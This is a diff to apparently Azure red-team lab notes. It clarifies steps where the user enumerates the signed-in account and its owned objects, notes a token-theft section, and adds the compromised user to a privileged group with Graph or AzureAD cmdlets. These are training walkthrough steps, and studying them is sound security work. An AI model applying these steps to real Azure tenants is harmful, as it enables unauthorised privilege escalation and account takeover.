@@ -626,6 +626,7 @@ Home> Automation Accounts> HybridAutomation | Runbooks
 - make sure you have a [shell]() from before
 - Now see whos logged in:
 ```az ad signed-in-user show```
+**- Write down the objectID for this user**
 
 - No surprise that the user Mark is using az cli from their workstation.
 - The tasks tells us to find another user or group that has interesting permissions on an automation account.
@@ -637,6 +638,7 @@ az automation account list
 
 - check for objects owned by the current user:
 ```az ad signed-in-user list-owned-objects```
+**- Write down the objectID for target group**
 
 #### Steal tokens for Student VM
 
@@ -666,13 +668,15 @@ Connect-AzureAD -AadAccessToken $aadToken -TenantId 2d50cb29-5f7b-48a4-87ce-fe75
 
 
 #### Adding to group 
-- Now, let's add Mark as a member of the group. In the below command ```–GroupId``` is for the group object id.
+- Now, let's add Mark as a member of the group. 
   - MG:
+  - In the below command ```–GroupId``` is for the group object id.
 ```
 $params = @{"@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/f66e133c-bd01-4b0b-b3b7-7cd949fd45f3"}
 New-MgGroupMemberByRef -GroupId e6870783-1378-4078-b242-84c08c6dc0d7 -BodyParameter $params
 ```
 - OR AAD:
+  - In the below command ```–ObjectiD``` is for the target Group and ```–RefObjectId``` is the users objectID.
 ```
 Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
 ```
